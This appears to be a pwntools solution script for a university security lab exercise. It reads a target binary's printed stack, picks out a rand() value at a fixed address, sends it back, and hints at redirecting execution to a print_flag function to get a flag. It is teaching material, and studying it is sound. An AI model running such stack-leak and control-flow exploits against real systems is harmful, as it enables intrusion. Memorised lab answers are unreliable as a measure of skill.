#!/usr/bin/env python3

from pwn import *

p = process(["/home/lab05/tut05-2-piped/target"])

# 1. recvuntil(s) reads data from the process until s
r1 = p.recvuntil(b"pwntools.)\n")
print(r1.decode()) # use decode() to print python bytestring as string

# 2. Read and parse the printed stack (lines)
lines = p.recvuntil(b"(hint: 4 bytes)\n")
          
cnt = 0  
for line in lines.split(b"\n"):
    if b"[" not in line:
        continue

    addr = line.split(b"]")[0].split(b"[")[1]
    value = line.split(b"|")[1]
    # 3. `value` is a raw bytestring (8 bytes) representing the value
    #    stored in one slot of the x64 stack. However, we are looking for
    #    a 4-byte integer generated by rand().

    high = value[:4]
    low = value[4:]
    
    # 4. u32(val) converts (unpacks) a 4-byte bytestring into an integer.
    #    Find a value that is different across runs. That is very likely the
    #    random integer we are looking for.
    value_high_int = u32(high)
    value_low_int = u32(low)
    print(addr, hex(value_high_int), hex(value_low_int))

    if (addr == b"0x00007fffffffe358"):
        rand_val = value_low_int # TODO: replace

# 5. Send the found random value as string. If you get it right, the binary
#    will print more information.
p.sendline(str(rand_val).encode())

print(p.recvuntil(b"(format: hexadecimal, e.g., 0xdeadbeef):").decode())

# 6. Follow the prompt and obtain a flag.
p.interactive()

>> (address 1)
>> (adress of print_flag)